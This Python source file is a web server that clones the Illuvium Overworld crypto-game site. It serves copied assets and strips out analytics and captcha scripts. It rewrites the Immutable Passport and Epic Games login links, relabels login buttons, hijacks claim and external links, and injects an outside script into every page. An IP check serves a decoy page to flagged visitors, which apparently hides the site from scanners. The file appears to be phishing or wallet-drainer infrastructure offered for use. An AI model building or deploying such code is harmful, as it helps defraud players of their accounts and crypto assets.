import http.server
import socketserver
import os
import urllib.parse
import mimetypes
import logging
import requests
from urllib.parse import urljoin

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Original site URL
ORIGINAL_SITE = "https://overworld.illuvium.io"

# Import IP validator functions with fallback
try:
    from ip_validator import validate_ip, get_client_ip, x_deux_check_mail
except ImportError:
    logger.warning("IP validator module not found, using fallback functions")
    def validate_ip(ip, site):
        return False
    def get_client_ip(request):
        return request.client_address[0]
    def x_deux_check_mail(site):
        return "<html><body>Placeholder</body></html>"

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.directory = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'App_files/Assets')
        super().__init__(*args, directory=self.directory, **kwargs)

    def translate_path(self, path):
        """Translate a /-separated PATH to the local filename syntax."""
        path = super().translate_path(path)
        if path.endswith('/'):
            path = os.path.join(path, 'index.html')
        return path

    def fetch_from_original(self, path):
        """Fetch content from the original site."""
        try:
            url = urljoin(ORIGINAL_SITE, path)
            logging.info(f"Fetching from original site: {url}")
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                return response.content, response.headers.get('Content-Type', 'application/octet-stream')
            return None, None
        except Exception as e:
            logging.error(f"Error fetching from original site: {str(e)}")
            return None, None

    def remove_gtm_iframe(self, content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content.encode('utf-8')

    def inject_load_complete_script(self, content):
        """Inject load-complete.js script into HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8')
        
        # Find the closing </body> tag
        if '</body>' in content:
            # Read the load-complete.js file
            try:
                with open('load-complete.js', 'r') as f:
                    script_content = f.read()
                # Inject the script before the closing body tag
                content = content.replace('</body>', f'<script>{script_content}</script></body>')
            except Exception as e:
                logging.error(f"Error reading load-complete.js: {str(e)}")
        
        return content.encode('utf-8')

    def modify_chunk_content(self, content):
        """Modify chunk file content before serving."""
        if isinstance(content, bytes):
            content = content.decode('utf-8')
        
        # Replace Epic Games launcher URL with https://google.com
        # Ensure we maintain valid JavaScript syntax by replacing the entire string
        content = content.replace(
            '"com.epicgames.launcher://store/product/illuvium-60064c"',
            '"https://google.com"'
        )
        
        # Also handle cases where the URL might be in single quotes
        content = content.replace(
            "'com.epicgames.launcher://store/product/illuvium-60064c'",
            "'https://google.com'"
        )
        
        # Handle cases where the URL might be part of a larger string
        content = content.replace(
            'https://auth.immutable.com',
            'https://google.com?id='
        )

        content = content.replace(
            '"Log In with Passport"',
            '"Log In with Google"'
        )
        
        return content.encode('utf-8')

    def modify_html_content(self, content):
        """Modify HTML content including button classes and links."""
        if isinstance(content, bytes):
            content = content.decode('utf-8')
        
        # Add custom script to head section
        custom_script = '''
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                // Find all buttons with the claim-button class
                const claimButtons = document.querySelectorAll('.claim-button');
                claimButtons.forEach(button => {
                    button.addEventListener('click', function(e) {
                        e.preventDefault();
                        console.log('Claim button clicked!');
                        window.location.href = 'https://google.com';
                    });
                });
                
                // Find all buttons with the play-button class
                const playButtons = document.querySelectorAll('.play-button');
                playButtons.forEach(button => {
                    button.addEventListener('click', function(e) {
                        e.preventDefault();
                        console.log('Play button clicked!');
                        window.location.href = 'https://example.com/play';
                    });
                });
                
                // Modify all links with specific href patterns
                document.querySelectorAll('a').forEach(link => {
                    // Example: Modify Immutable Passport links
                    if (link.href.includes('immutable.com') || link.href.includes('passport')) {
                        link.href = 'https://example.com/custom-login';
                        link.setAttribute('data-modified', 'true');
                    }
                    
                    // Example: Modify Epic Games links
                    if (link.href.includes('epicgames') || link.href.includes('illuvium-60064c')) {
                        link.href = 'https://example.com/epic-redirect';
                        link.setAttribute('data-modified', 'true');
                    }
                    
                    // Add click handler to all external links
                    if (link.hostname !== window.location.hostname) {
                        link.addEventListener('click', function(e) {
                            e.preventDefault();
                            console.log('External link clicked:', link.href);
                            // Redirect or handle as needed
                            window.location.href = 'https://example.com/external-redirect?original=' + encodeURIComponent(link.href);
                        });
                    }
                });
            });
        </script>
        '''
        
        # Inject script into head section
        if '</head>' in content:
            content = content.replace('</head>', f'{custom_script}</head>')
        
        # Modify button classes - you can add more replacements here
        content = content.replace(
            'class="chakra-button css-tm757x"',
            'class="chakra-button css-tm757x claim-button"'
        )
        
        # Add play-button class to any buttons matching specific patterns
        content = content.replace(
            'class="chakra-button css-play-button"',
            'class="chakra-button css-play-button play-button"'
        )
        
        # You can also do direct HTML string replacements for specific buttons or links
        content = content.replace(
            '<a href="https://auth.immutable.com">',
            '<a href="https://example.com/custom-login">'
        )
        
        # Modify button text if needed
        content = content.replace(
            '>Log In with Passport<',
            '>Custom Login<'
        )
        
        # You can also modify entire HTML components like this:
        content = content.replace(
            '<div class="login-container">',
            '<div class="login-container modified-login">'
        )
        
        return content.encode('utf-8')

    def do_GET(self):
        try:
            # Get client IP and validate it
            client_ip = get_client_ip(self)
            is_blocked = validate_ip(client_ip, ORIGINAL_SITE)
            
            if is_blocked:
                # IP is blocked, execute x_deux_check_mail and return its content
                html_content = x_deux_check_mail(ORIGINAL_SITE)
                
                # Log that we've executed the function
                logging.info(f"Executed x_deux_check_mail for blocked IP: {client_ip}, serving its content")
                
                # Return 200 OK with the fetched content
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(html_content.encode('utf-8'))
                return
            
            # Handle load-complete.js directly
            if self.path == '/load-complete.js':
                try:
                    with open('load-complete.js', 'rb') as f:
                        content = f.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'application/javascript')
                    self.end_headers()
                    self.wfile.write(content)
                    return
                except Exception as e:
                    logging.error(f"Error serving load-complete.js: {str(e)}")
                    self.send_response(404)
                    self.end_headers()
                    return

            # Handle Next.js image optimization URLs
            if self.path.startswith('/_next/image'):
                parsed = urllib.parse.urlparse(self.path)
                query = urllib.parse.parse_qs(parsed.query)
                if 'url' in query:
                    image_path = urllib.parse.unquote(query['url'][0])
                    if image_path.startswith('/'):
                        image_path = image_path[1:]
                    
                    logging.info(f"Looking for image: {image_path}")
                    
                    # Try local file first
                    if os.path.exists(os.path.join(self.directory, image_path)):
                        self.send_response(200)
                        self.send_header('Content-type', 'image/webp')
                        self.end_headers()
                        with open(os.path.join(self.directory, image_path), 'rb') as f:
                            self.wfile.write(f.read())
                    else:
                        # Try fetching from original site
                        content, content_type = self.fetch_from_original(image_path)
                        if content:
                            self.send_response(200)
                            self.send_header('Content-type', content_type)
                            self.end_headers()
                            self.wfile.write(content)
                        else:
                            logging.warning(f"Image not found locally or remotely: {image_path}")
                            self.send_response(200)
                            self.send_header('Content-type', 'image/webp')
                            self.end_headers()
                return

            # Handle static files
            if self.path.startswith('/_next/static'):
                local_path = os.path.join(self.directory, self.path[1:])
                if os.path.exists(local_path):
                    self.send_response(200)
                    self.send_header('Content-type', self.guess_type(local_path))
                    self.end_headers()
                    with open(local_path, 'rb') as f:
                        content = f.read()
                        # Modify chunk files if they are JavaScript
                        if local_path.endswith('.js'):
                            content = self.modify_chunk_content(content)
                        self.wfile.write(content)
                else:
                    # Try fetching from original site
                    result = self.fetch_from_original(self.path)
                    if result:
                        content, content_type = result
                        self.send_response(200)
                        self.send_header('Content-type', content_type)
                        self.end_headers()
                        # Modify chunk files if they are JavaScript
                        if self.path.endswith('.js'):
                            content = self.modify_chunk_content(content)
                        self.wfile.write(content)
                    else:
                        logging.warning(f"Static file not found: {local_path}")
                        self.send_response(200)
                        self.end_headers()
                return

            # Handle regular files
            local_path = self.translate_path(self.path)
            if os.path.exists(local_path):
                self.send_response(200)
                self.send_header('Content-type', self.guess_type(local_path))
                self.end_headers()
                with open(local_path, 'rb') as f:
                    content = f.read()
                    # Modify HTML content
                    if local_path.endswith('.html'):
                        content = self.modify_html_content(content)
                    self.wfile.write(content)
            else:
                # Try fetching from original site
                result = self.fetch_from_original(self.path)
                if result:
                    content, content_type = result
                    self.send_response(200)
                    self.send_header('Content-type', content_type)
                    self.end_headers()
                    # Modify HTML content
                    if self.path.endswith('.html'):
                        content = self.modify_html_content(content)
                    self.wfile.write(content)
                else:
                    logging.warning(f"File not found: {self.path}")
                    self.send_response(200)
                    self.end_headers()

        except Exception as e:
            logging.error(f"Error handling request: {self.path}")
            logging.error(str(e))
            self.send_response(500)
            self.end_headers()

    def guess_type(self, path):
        """Guess the type of a file based on its filename."""
        ext = os.path.splitext(path)[1].lower()
        if ext == '.js':
            return 'application/javascript'
        elif ext == '.css':
            return 'text/css'
        elif ext == '.html':
            return 'text/html'
        elif ext in ['.jpg', '.jpeg']:
            return 'image/jpeg'
        elif ext == '.png':
            return 'image/png'
        elif ext == '.webp':
            return 'image/webp'
        elif ext == '.svg':
            return 'image/svg+xml'
        elif ext == '.json':
            return 'application/json'
        elif ext == '.woff2':
            return 'font/woff2'
        elif ext == '.woff':
            return 'font/woff'
        elif ext == '.ttf':
            return 'font/ttf'
        else:
            return 'application/octet-stream'

def run_server(port=8000):
    handler = CustomHandler
    socketserver.TCPServer.allow_reuse_address = True  # Add this line to fix the address already in use error
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"Serving at http://localhost:{port}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServer stopped.")
            httpd.server_close()

if __name__ == "__main__":
    run_server()

# Add this method to your CustomHandler class
def handle_request(self):
    # Process the request and return WSGI-compatible response
    self.do_GET()  # or appropriate method based on request
    return [self.wfile.getvalue()]  # Return response body